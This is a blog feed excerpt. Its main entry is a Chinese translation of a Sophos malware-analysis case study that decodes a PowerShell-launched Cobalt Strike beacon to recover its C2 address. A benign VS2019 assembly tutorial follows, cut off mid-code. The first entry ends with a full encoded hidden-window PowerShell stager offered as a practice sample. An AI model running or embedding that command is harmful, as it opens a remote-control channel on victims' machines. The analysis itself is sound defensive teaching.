    <content type="html"><![CDATA[<blockquote><p>本篇文章翻译自 <a href="https://community.sophos.com/sophos-labs/b/blog/posts/decoding-malicious-powershell">Decoding Malicious PowerShell Activity – A Case Study</a></p></blockquote><p>IT 管理人员和安全专家经常会遇到一些看起来比较可疑的 PowerShell 命令，他们有时能够解开这些可疑的命令，但常常还得靠研究人员。本篇文章旨在让大家能够从下列项中来了解可疑命令的目的：</p><ul><li>Scheduled Tasks (预定任务)；</li><li>RUN Keys in the Registry (注册表中的 RUN 键值)；</li><li>Static PowerShell Scripts (PowerShell 静态脚本)；</li><li>Proxy Logs (Web 服务被 RCE 利用下的代理日志)；</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-EncodedCommand</span> JABzAHIAdgBzAHkAcw..</span><br></pre></td></tr></table></figure><p>以下为 Autoruns 导出的数据，数据来源于 Sophos 的检测。在检查日志后，可以发现以随机字符命名的服务名称出现，如下图中所示，圈起来的部分，它的属性看起来非常有趣：</p><p><img src="https://image.zeronohacker.com/article/2021/03/30/0642bb05df98f0a9496e6c8891b511b4.png" alt=""></p><div class="tip "><p>Autoruns 保存的数据文件为 arn 格式</p></div><p>按照常理来说，Windows Server 上会有这样的服务吗？正如预期所那样，这可能是恶意的。这个方法称之为 Living-Off-The-Land (LOLBins)，即在没有文件落地 (硬盘) 前就执行恶意代码，主要是为了避免触发任何警告。AV 是基于静态的检测发展过来的，它也完全无法能摆脱这种技术，但是可以通过采取保护措施来保护终端用户机器。</p><p>此时，需要对上图中长字符串进行 base64 解码。</p><p>以下为一张 base64 代码快速预览表，我把它们都放在了一起：</p><div class="table-container"><table><thead><tr><th>base64 代码</th><th>解码</th><th>描述</th></tr></thead><tbody><tr><td>JAB</td><td>$.</td><td>变量声明 (UTF-16)</td></tr><tr><td>TVq</td><td>MZ</td><td>MZ 头部</td></tr><tr><td>SUVY</td><td>IEX</td><td>PowerShell Invoke 表达式</td></tr><tr><td>SQBFAF</td><td>I.E.</td><td>PowerShell Invoke 表达式 (UTF-16)</td></tr><tr><td>SQBuAH</td><td>I.n.</td><td>PowerShell Invoke 字符串 (UTF-16)，比如 Invoke-MimiKatz</td></tr><tr><td>PAA</td><td>&lt;.</td><td>Emotet 经常使用 (UTF-16)</td></tr><tr><td>aWV4</td><td>iex</td><td>PowerShell Invoke 表达式</td></tr><tr><td>aQBlA</td><td>i.e.</td><td>PowerShell Invoke 表达式 (UTF-16)</td></tr><tr><td>dmFy</td><td>var</td><td>变量声明</td></tr><tr><td>dgBhA</td><td>v.a.</td><td>变更声明 (UTF-16)</td></tr><tr><td>H4sIA</td><td></td><td>gzip 标志 (0x1f8b)</td></tr></tbody></table></div><p>字符串 JABz[..]IAagBwA= cin 最基本的形式是 onion，它具有多个层次，可以巧妙地隐藏真正执行的操作，从而逃避检测，但是与 onion 不同，它只有三层，下面让我们来剥开每一层。</p><h2 id="第一层-–-Episode-1"><a href="#第一层-–-Episode-1" class="headerlink" title="第一层 – Episode 1"></a>第一层 – Episode 1</h2><p>这个字符串可以使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 来解码，其中包含大量用于编码和解码的小工具：</p><p><img src="https://image.zeronohacker.com/article/2021/03/30/25b8f052f7274ef5e33b93af2d22643e.jpeg" alt=""></p><p>解码后如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span>=<span class="built_in">New-Object</span> IO.MemoryStream(,[<span class="type">Convert</span>]::FromBase64String(<span class="string">&quot;ANOTHER_LOONG_STRING_R_U_KIDDING_ME&quot;</span>));<span class="built_in">IEX</span> (<span class="built_in">New-Object</span> IO.StreamReader(<span class="built_in">New-Object</span> IO.Compression.GzipStream(<span class="variable">$s</span>,[<span class="type">IO.Compression.CompressionMode</span>]::Decompress))).ReadToEnd();</span><br></pre></td></tr></table></figure><p>对上述确码后的字符串有两个解决方法：</p><ul><li>再一次使用 base64 来解码；</li><li>字符串有出现 Compression/Decompression，也许可对其进行解压；</li></ul><p>以下这张图描述起来更形象：</p><p><img src="https://image.zeronohacker.com/article/2021/03/30/98c37141e9460e762f1db05720592ca8.jpg" alt=""></p><h2 id="第二层-–-Attack-of-Compression"><a href="#第二层-–-Attack-of-Compression" class="headerlink" title="第二层 – Attack of Compression"></a>第二层 – Attack of Compression</h2><p>现在把 H4sIAAAAA[..]GDQAA 进行 base64 解码，如下图所示：</p><p><img src="https://image.zeronohacker.com/article/2021/03/30/6259623f14c9c18c986f2782df46fca6.jpeg" alt=""></p><h2 id="第三层-–-The-Last-Beacon"><a href="#第三层-–-The-Last-Beacon" class="headerlink" title="第三层 – The Last Beacon"></a>第三层 – The Last Beacon</h2><p>查看解码后的内容，并没有什么东西能引起我的注意，看不到 URL，IP，可识别的端口号或像 DoEvilStuff() 和 DestoryTheResistance() 之类的函数，但在结尾处有一长串字符也许能探索出东西来：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">Byte</span>[]]<span class="variable">$var_code</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&quot;/OiJAAAAYInlMdJ..ENUFF_IS_ENUFF_I_QUIT..jEwOAA=&quot;</span>)</span><br></pre></td></tr></table></figure><p>同样用 CyberChef 来解码，如下图所示：</p><p><img src="https://image.zeronohacker.com/article/2021/03/30/ffd013fb5e870f15c3a4dedf8fbc0fe8.jpeg" alt=""></p><p>解码出来的已不在是 [PowerShell，Batch，JS，VBS 等] 脚本，而是 Shellcode。我们遇到过攻击者将 PE 文件代码嵌入在脚本文件中，什么是 ShellCode？在黑客攻击中，ShellCode 是一小段代码，通常用在软件利用漏洞的 Payload，之所以称之为 ShellCode，是因为它会启动命令 shell 程序，攻击者可以通过该 shell 程序来控制受感染的计算机，但是执行类似任务的任何代码都可以称之为 ShellCode。</p><p>机器 A – Bob 所有，为攻击者</p><p>机器 B – Alice 所有，为受害者</p><p>启动命令 Shell 可以为 Bob 提供一个途径，在机器 B 上执行一段恶意程序，可以想象这么一个场景：</p><ul><li>Bob 知道 Alice 喜欢可爱狗狗图片，因此给她发一封伪装的电子邮件，里面有一个恶意附件，上面写着 “你见过狗演奏四弦琴吗？单击此处查看！”，她单击了此处，然后 Bob 会在 Alice 不知情的情况下进入她的电脑；</li><li>Bob 知道 Alice 正在运行一台非常旧的 Win7 的电脑，他利用 EtermalBlue 漏洞远程攻击 Alice 操作系统，而无需用户干预；</li></ul><p>在分析了 ShellCode 之后，我们发现它是 Cobalt Strike 的一部分。Cobalt Strike 是一个威胁仿真软件，该软件有助于进行安全评估，可复制网络中高级对手的策略和技术，但是总是会有人经常滥用此工具对企业进行攻击。</p><p>什么是 Beacon？Beacon 是 Cobalt Strike 的 Payload，用于为高级攻击者建模。</p><p>有时候使用正常的解码看不到 IP 地址，上面的示例非常简单，但是为了演示起见，可能会在 ShellCode 之后找到类似的代码：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">Byte</span>[]]<span class="variable">$var_code</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;38u[Redacted_Chracters_CMjIyMg&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> <span class="operator">-lt</span> <span class="variable">$var_code</span>.Count; <span class="variable">$x</span>++) &#123;</span><br><span class="line">    <span class="variable">$var_code</span>[<span class="variable">$x</span>] = <span class="variable">$var_code</span>[<span class="variable">$x</span>] <span class="operator">-bxor</span> <span class="number">35</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上述代码，接下来需要一个 XOR 操作，如下图所示：</p><p><img src="https://image.zeronohacker.com/article/2021/03/30/ac0de83a12a589ee835162ce4dd14f18.png" alt=""></p><p>你也能使用 scdbg 工具，scdbg 是一个 ShellCode 仿真工具，运行它时，会向用户显示 ShellCode 试图调用的 Windows API。</p><p><img src="https://image.zeronohacker.com/article/2021/03/30/6ab3f8a0d7745b54c84f9d3f300191eb.png" alt=""></p><p>scdbg 运行此 ShellCode 后：</p><p><img src="https://image.zeronohacker.com/article/2021/03/30/5117f83ee7c2c63a500dd32da2183e14.jpeg" alt=""></p><p>IP 在演示中可能有所不同，因为我想在这里介绍两个示例，即恶意代码中有没有 XOR：</p><p><img src="https://image.zeronohacker.com/article/2021/03/30/7bb26d5f237ac4636282f8f95ba68d1c.png" alt=""></p><p>Success！我们有 IP 地址以及 ShellCode 调用的端口，以获取进一步的指示。在活动事件中，快速提取并将此信息快速传递给客户的能力会产生重大影响。现在，他们可以监视/阻止此 IP 和相应的端口 (作为事件响应的一部分)，切断攻击者对其资产的访问。</p><p>直接在内存中执行 ShellCode 会让人感到意外，因为如果它被放在某个磁盘上 (包含依赖项)，分析员会对它进行分析，或者会上传到 VirusTotal 上，文件会立即公开。</p><p>我想用公开的一小段 [Courtesy: <a href="https://community.sophos.com/members/od">OD</a>] 来结束本篇文章，这小段可以拿来练习。如果你发现一个名为 UigioaCuQxDqfwNx 的恶意服务，并出现以下字符串，如果你想深入 C2 IP，请以安全的方式发布。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%COMSPEC% /b /c <span class="built_in">start</span> /b /min powershell <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-encodedcommand</span> JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWAA2ADMATwBpAFMAaABiAC8ASABQADgASwBQAHEAUgBLAEwAVQAyAEMAagA1AGcANABXADEATgAxAFYAVQBCAFEAUQBCAFQAZgB1AGEAawBVAGoAeABaAFIAbwBIAGsAMABLAE4ANgBaAC8ALwAwAGUAVQBIAE0AegBPADUAbgBkAHEAZABxADEAaQByAEsANwBPAGMALwBmAGUAZgBSAEIAUgBlAFIATwBKAGEARgB0AEUAQQBtAGIAaQBMAHEAYgBvAHoAQwB5AHMAVQBmAFYAQwA0AFYAYgBCAGcAdQBFACsAawByADkAVQBTAHgAcwBZAHMAOABnADIAWABHADIAZQBMAE0AUQBlAGYATgBEAGIATAB4AHAAcABoAG0AaQBLAEsATAArAEsAdAB3AG8AVwBxAGkANQBWAE8AawAyADAAYwBJADMARgA1AHUAeABnADYAcABVAHYAcwBrAEkAawBSAG0ASABxAEgAeAB6AFUANwBqAEoAagAyAEkAdgAwAGoAYgBvAHoAZABPAEkAbgBhAEEAMwBGADUARQB0AE4AaQBOAFEAVgBIAHIAcAArAEQANgBEAFgAYwAzADIAWAByADkAOAA2AGMAVgBoAGkARAB4AHkAMwB0AC8AMwBFAGUAbABFAEUAWABKADEAeAAwAFoAUgBxAFUAeAA5AG8AeABaAGIARgBLAEsANwBrAGIANQBEAEIAcQBIACsAbwBtADcAZgA3AHYAcwBPADEAagBYAG4AUQBwAGIAMgBOAEcATQBMAEQAbgBVADgATQAzAHMAbgBZAGsAUABMAFAATABoAFgAZgBjAGMAbQBwAGUASwBmAGYAeABiAEwATAAzAGUAMQAxADMAcwAyAGkARABVAG4ASwBoAFgAVgBOAEMATABJAHYAVABjAGQAcAAxAGkAbQB2AHAAYwB6AGgAZABQAFUAUgA2AFcAaQBaAEIAcwBoAGoAdgBDAEcAMwBDADkAcwByADEARwAvAG4AKwBYAFcAeQA3AG4AeAAwAHQAbgAyAFkAdgBuAGkAbQBlAFYAcgA0AE0AZQB2AG4AYwB5AGsAbgBuAGwASwBSAFYAZwBxAGcARQAzAG4AagBHAEcAeABTAHIAMQBrACsAbAA1AGUAWAA2AGsALwAzAHEAMgBaAHgAQgA2AHgAWABYAFEAdgBlAEEAUwBGADIARgBkAFIAbQBOAGcARwBpAHUANQA1AHoAVABNAGQATgBFAEUAYgBZAEMAdABHAEUARAA3AFAASwBwAGIAQgBpAEIAQwBSAE8AUABTAG8AcQB5ADMAQQBsACsAQQA5AEsAdAAxADYAcwBlAE4AVQBRAGUANwBMADcAOABwADkATABjAG4AbwBjAEEAWAAzAGQANQBsAEsASAA1AG0AQQBTAGkARgBoAHUAWAByAEoAaQBkACsAQgBRADgAcgB6ADUAaQB3AE8AMwBQAG4ASgArAGcALwBKAFYAWQBiAGYAVAB3AGwAVwBMAG4AdwB2AGYASgBLAHEASgBuAEsAUQBwAFIASAAwAFIAZwBEAGYARAA3AGwAYQB1AEwAbAA1AHkAWgBjAEkALwBDAGsAcABPAEwASgB6AHYAcQA4AFUAWABhAFUAawBNAEUASQBqAE8ARQB5AHoAYwBFADcARABHAEoAVgBmAC8ANABuAFAAVwBlADIAVgBNADYAcgArAFUAbABEAHQAeQBuAFgAaABPAFkAZgBuAGIATQBkAFgANgBtAFcATwBiAGYATwAxAGMARgBNAHUAWABMAEkAbgBPADMALwBUAFkAOQBzAHgAVQBaAGkAOQAvADMAVQAxAE0ARwBoAGoAZQA0AGgASgBQAGMAMgAxAGoAVwB2AEMAbAB6ADYATABHAGQAbwA0AEsATQBmAGoALwBrAG8AbQBnADUAMgBsADQAdQBVAEYATQBwAGsATABPAHMAVQBNADAASgBlAGYAMgBWAGoAWABKAHUAKwA4ADMAYgBOAHgASABRAFAAaQBIAG8ARgBWAGsAQgBMAGwASAA0ADAANQB4ADcAQgBVAEYARAB3AEoAdQBZAEQAZgBlAFEAOQBwAGUAcgB1AEIATQBrAE4AWAA2AGsAdABwAHAAVgBmAHQAMgBUADcATAA1AFoANgBqAFIAVgBHAFYAVQBtAEsAbwBjADYATgBLAHEAVQBoAHoAawBGAG0AbABPAGwANQBrAFgAMQA1ADEAWQBvAEwAegBaAGYARQBmAGMANgBYAFkASQBiAGEAaABSAGUAUQBxADcAcgBYADgAQwBhAFEAWAAxAFQAMwBzAFEAYwBYAEUAQgBrAFEAWABZAEoAaQBxAFAAagBKAHMAegBjAGwAUQBxAFYASwA4AGIAYQBKAHUAcQB0AHIAVwAxAFkAVABpAHAANQBqADAATgBNAGUAQgBrAGcATgBKAEMAYwBRAEUAVABqAEkAcwBWAEoATABsAFQARwBoAFcALwB6ADAALwB5AHYAYwBxAEkAbwBMAHIATwA4AGcARgA2AHIAdwBMAGMAWQA1AG0AUQBjACsANQBWAEYAUwBlAGIAcABxAEYAegBPAEoALwBNAFAAdABhAEoAKwBlAGkAeQBMAEMANgBnAHYAVABCAGEARQBnAEEAMQBjAEcAawBTAHMAMwB0AGsARQBCAGYASwAxAFoALwBTAHIAegAvAHoAYgB3AGYAVwA4AHcAUABaAHYAWgBDAGQAQQBsAGsASwBTAC8ARQBsADIANQBLAHMAbgBMAEoASwBZADMAcwBjAHYAbgA2AGoAbQBXAE8AWABFAGcAQQBOAFMANwBFAGIAbABlAEwAVQBLAHUAcAA1AG0AMgBzAFYARwB3ADgAeAA0AEcAUQBTAHIAdAB4AEsAKwB5AHoAQwBjAGMASABQAEQAdQBGAEoANABHAG4ARQBYAEMAcwBLAEEANABtAGYAbgBjAGkARwBtAHcAOABVAG4AaAA2AHMAQgBIAEcAegAwAHcAegBQAHMAUgBDAFAATwAzAFMARABZADQARwB1AGwAUABRAFoAegBkAEMATQBzAEsAcgBXAHUAdwAyAGEANgBZAHYASgBEAEsAYwBSAFUAOABCAEgAegBGAEMAdwBuAFQANABlAG8AQwA1AGwAbQBXADMATAAzAEwATwAvAEcAUAA5AFUATgBPAFgAQQB2AGUAawA5ADcAawBtAFAANAArADQAagBKADQAWABrAGkANABYADkATgBvAFkAMQBnADkAQwAwAHMATQBEADQASAB0AHUAKwBWADcAMwBZAEQAWQBSAE8AMgBpAGgAcABXAGcAYwBHAHUAUQBaAGEAZABZAHgASABjADQAcgBLAGwAMwByAHoAMQBOAFoAbgBMAE8AKwByAEgAcQBtAHEATgBmAEcAMwBFAEEAKwAxAFYAUAB3AEMAZgB4AFMARwAvAHkARQBOAHUARgBSAGoAMAA1AHQAZwBhAGQARwBPAHcAcgA0AHoARgAvAFUARgBRAFAARABHAHcAdwBFAGYAcABDAHEAagA1AFkAdABwAFAATABCAG8AQQBrAGQAaABDAGUAbgBvAGEAeABQAGEAZgBBAE0ALwBIAEkAVABNAEQAbQBxAHEAVABSAHAAdABzAHkAagBzAGUAUQBPAHgAbABJAFcAVQAzADQAbAA5ADAARgBIAEUAQwArAHMASgBpACsATAArAE4AagBaAEMAYQAyAFEAVQBWAFgAegBwAEUANgBQAE4AYgBXADIAZABoAEoAdABhAGIAUwA5AFEANgA1AGYATgBZADgASABjAHgAYQBOAEIAbABPAHkAYQBpAGkAYQAyADAAeABUAHIANgBVAEsATwArAEUAbwBHAGoANgBaAEwAdwBlAHQAVQBFAHQANwB2AG0AZwBqAHYAYgBzAGgAbQBkAHkAQgB1AEwAWQBHAGIAUgBiAFcATABEAG4AUwBxAGoAcABKAFQAZABEAHIAOABGAE4AbQBDAEgAcQA5AG4AaQBTAEIARAA5AG8AagB0ADkAcQBqAGgAagBKAGMAeQBDAGUAagAwAFIAVwBOAE4AQgBUAEEARAAyAFgAWQBzAGsASAAyAE0ANQBFAGEAYwBNADcAMAAxADQAOABtAE8AOQB1AHAANwBBAEcAYgBnAHMAWABpAHcAWABCAHAAdABaAGEAUAB3AFUAbgBoAG4AWgBvADkAcQB1AGwAeAB2AHoASwBQAGUANgAyAFEAKwBCADcAbQBtADcAWABBAHEAbABmAEEATwBkAFAAdgAxAEsAZgBtAGIASQBrAGQAdgBrAEkARwBEACsANQBzADEASAByAFUAMAAvAGoAQgBQAEQANwBJAHcAQgAwAFIAMQBuAG0AbwBLAGEANgAvAFEATAA0AHoAbwBqAGQAcwBxAE0AcgAxAEcAYgB1AGUATQBPADYAQQBuAGUAeAByAHkALwA1AFkAagBxAGUAYwBNADUAegBTADcAUgA3AFQAWABjAG4AcwBRAFIATABIADcASABFADAAbwB3AGQATABkAGMAOABwAGsANgAzAEYANgBGADQAMwBXAEYAdQBTAHgAawB5AGsAVgBhAGMAeABHAFUANQBuAHAAagBUAG4ATwBvAHkAKwBOAEIAaAB1AFQASwB2ADkAagB0AHkAWQB6AFgAdwArAGsANQBmAEwATwBGAHIATQBhAG4ARQBNADEAbAB1ADgATQBoAHIAbQAxAGgAagBqAGUASwBnAHEAegBiAGsAZgBjACsAcgB3AGEAUwBLADEAVgBpAHYATQBMAHEAeABIAFcAVwBtAHAANwBUADAAegBTAFoAKwBTAFcAcQBYAHQAdABKAGEASgB0AGwAbgB2ACsAOAA5AE4ATABuAEEAbgBzAFQAbQBXAEoAVgA2AGUASQAxAFoAcQBMAHgAUgBtAEYAaQByADkAVQA1AGUAdgBrAC8AWABhAGwALwBaAGEANQBMAFcAUwBQAGgAdgA0AHMAagArAGIANwBlAHkAdABQAGYAYgAyAGsASABnADQARwBUAHoATwBEAHIASwA4ADYASgBLAGwAdQBlAGgAdQBCADAAKwBDAEsAZwA3AFgAUQBhAHQAegBXAE0AbQA0AFYAMgBIAG8AcgBiADcAcgBIAHAALwBkADkASQBqAEcAegBsAE8AMABhADIAKwBSAEkAZABhAEcAKwAwAEUAOABxADcAdAA2AHgAVwBHADIAeQB0AEsAYQBWADgAWQBLAHIANgBkAHkAZQByAFEAVwBkAGIARgBqADkAcABkAEQAcQBiAC8AcgBIAEMAYgBNAFkATQBOAEgALwBuAFQAagB1AHkAZAA5AHUAdABuADUAZgBXADAAZABJAG8ANQBPAFAARwAvAGsASwByAE8AdwBWAHgAbgBqAFYAUwBCAEwAYwB6AEoAegA5AG4AaAB5AGUAbABEAFcAagBqAEoAZAByAEMAdQAxAGoAYQBpADIAUgBpAEcAeQBWAGwATwB6AGYAdwBwAFkATABuAEUATgBsAHIARAAxADUASQBpAE0AcAAyAEIATABGAHMASgBPAGIAWQA4AFcAMQBoAEoAeQBjAGUALwBzAEkASQA5AFAAawBOAE0AaQBQAEQAdQBoAE0AUgBGAFIAMAB6AHcAYwBJAGMAZQBpAEEAYwA1AHEAWgBTAGMAawBmAG0AbwBNAFEAOQBaAGsAbwAxADAASAA5AGcAWQAvAEYAeQBWADkARQBSAHoATQBVADkAMgBQAEkAZQB5AGEAdABSAGYAaQBIAHQAUwA0ADMAawBjAFYAUgBnAHoASQBFACsAUwBkAHMATwB4AGIAOQBLAFIALwBvAEgAWABXAGcAcABqAFoAZQBkADEAWgBXAGYAZgBhADQAQgBEAG0AawBXAE4AMgB4AC8AKwBMAGcAdgA4ADcAaAAxAEQAdgAvAFEAbQA2AEUAagBTADgANwBMAHgAUwBLAFcAZAB6AHcAdgB1AGIAbAA5AHYAagA2ADMAVwB1AGUAOQAvAGYANgBVAGUAUQAxAG4AagBNAGUAbAAzACsASgB0AEUAKwBkAEwAaABmAEQAVQB1AFMARgBrAFoAYgB6AFkASABPAEIAdwBQAFAAOQBiAHIAaQBjAE0AaABkAHgAaABZAEYAMgB4AGwASABxAGYAVAA1AHAATAAxAEgAbwBZAGMAYwBtAEUASgBoAFQAcgAwADIAKwBZADcAagBZAEMATQBiAHQASAA0AHgAOABjAEQAWQBkAHgANwBHAFgAdQBFAHkAbQA4AEcAeQBVAGYAOQAwAFYAYQBiAGUAQwBXAEcANgBPAHYAdQBrAHgANQB0AE4AUABvAHgAYwBQAEwAegBPAFoARgBmAEMATAAxAC8AVwA0AEYANwAxAEEANABnAGkAOABpAHkAeQByAFYATAAwAHMAVQBIAFQAZABQAGIAZgBwAE0AdQBGADMANABlAGwAaAAvADIAMAA5AEMANgB1AG0AZwAxAGoASAB5AHoANQBxAE0AbgBKAE4AWgBVAHYANgBJAGUAeAA1ADYATAAvAFkAdwBCACsAVQBQAHIAZgBvAGMAMwBBAHkAKwBlADUAZAArAGgAeQBnAHoANwBIAHEAMQB3AG8ALwBsAEUAbwBDAEIAdgBxAHcAMwBsAGsAbgArAEIAcgBCAFEAWABVAGMANQA1ADcARQBkAEYAQwBjAHIAZgBEAE8AbgB6AGEANQBIAGQAMQA2AFYAWQByAFUAdwBLADcAcABHADQAMQA2AGoAdAAxAEIAKwA1ADEAbwBrAFkAZAB2AG0AOQBDAEsAOAA0AHUAYgB1AHIAOAB1AGYAYQBOAE8AbQBqADIAbQBmAEUAYgBOAFUARQBHAGcAbgBIADcAYgBvAEIAMQB5AEYASQBFADgAMQBjAG0ATwBoAGUAUwBFAGMAUABaADMANABXAEQAVwBDAGoALwBEAFEAQQBBACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本篇文章翻译自 &lt;a href=&quot;https://community.sophos.com/sophos-labs/b/blog/posts/decoding-malicious-powershell&quot;&gt;Decoding Malicious Pow</summary>
      
    
    
    
    <category term="安全技术" scheme="https://zeronohacker.github.io/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="PowerShell" scheme="https://zeronohacker.github.io/tags/PowerShell/"/>
    
    <category term="Scdbg" scheme="https://zeronohacker.github.io/tags/Scdbg/"/>
    
  </entry>
  
  <entry>
    <title>在 Win10 下如何用 VS2019 编译汇编及 win32 汇编程序</title>
    <link href="https://zeronohacker.github.io/2021/02/22/how-to-use-vs2019-to-compile-assembly-and-win32-assembler-under-win10/"/>
    <id>https://zeronohacker.github.io/2021/02/22/how-to-use-vs2019-to-compile-assembly-and-win32-assembler-under-win10/</id>
    <published>2021-02-22T13:42:22.000Z</published>
    <updated>2021-09-20T13:49:06.342Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>操作系统：windows 10 2004</p><p>工具：VS2019、MASM32</p><h2 id="如何编译汇编程序"><a href="#如何编译汇编程序" class="headerlink" title="如何编译汇编程序"></a>如何编译汇编程序</h2><p>启动 VS2019，点击创建新项目，再点击创建空项目，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2021/02/22/07a2a2b43100a1bc1ef271a6883a1c90.png" alt=""></p><p>创建好了之后，先不要急着创建新文件，这时需要先做一个操作，右键项目，在生成依赖中点击生成自定义，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2021/02/22/575148f039ed98fe895c68ab6697aa13.png" alt=""></p><p>在弹出的生成自定义选项中在 masm 前面打上勾，因为后面我们创建的 asm 文件需要 masm 编译器，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2021/02/22/5f9357e94db03441f6710a9c9713db22.png" alt=""></p><p>下面我们就可以创建 asm 文件写汇编代码了，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2021/02/22/387bb92441796f4f1ec712e3136e1da8.png" alt=""></p><p>为了更好的阅读我们写的汇编代码，需要安装一个汇编语言的语法高亮插件，点击扩展菜单栏中管理扩展选项，在插件市场中下载，插件名为 AsmDude，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2021/02/22/5b0644e250b3f65bdca0dcd26cf92315.png" alt=""></p><p>安装会要求重启 VS2019，重启后便可以开始愉快编写汇编代码了，最终尝试编译链接，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2021/02/22/069d3651bc13fcbe69594ae9f8f639f4.png" alt=""></p><p>示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode:DWORD</span><br><span class="line">.code</span><br><span class="line">main PROC</span><br><span class="line">    </span><br><span class="line">    mov eax, 5</span><br><span class="line">    add eax, 6</span><br><span class="line">    invoke ExitProcess, 0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p><strong>如何调试</strong></p><p>在需要调试的地方打上断点，按 F5 启动调试，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2021/02/22/0637ff819f8dc8d715c1f48b2662de7b.png" alt=""></p><p>下面来说下 win32 汇编程序。</p><h2 id="如何编译-win32-汇编程序"><a href="#如何编译-win32-汇编程序" class="headerlink" title="如何编译 win32 汇编程序"></a>如何编译 win32 汇编程序</h2><p>win32 汇编程序比上面简单的汇编程序有所不同，因为此类程序必须涉及到 win32 API，所以在编写这类程序时需要用到 MASM32 SDK 工具包，此工具包下载地址：<a href="http://www.masm32.com/download.htm，工具包安装也很简单，一路同意">http://www.masm32.com/download.htm，工具包安装也很简单，一路同意</a> next 即可，安装好目录如下所示：</p><p><img src="https://image.zeronohacker.com/article/2021/02/22/8ad4a277e68e0c34e243d0bff61899ad.png" alt=""></p><p>其中 include 和 lib 这两个文件夹里的文件待会就会用到。include 文件夹里包含了各种 inc 文件，而 inc 文件里包含了 API 函数的声明；lib 文件夹则包含了许多 lib 文件，这此 lib 文件是存放着 API 函数的信息，在链接时需要用到。在 VS2019 中新建一个空项目，生成自定义项中勾上 masm，再新建一个 asm 文件，在文件中输入以下示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 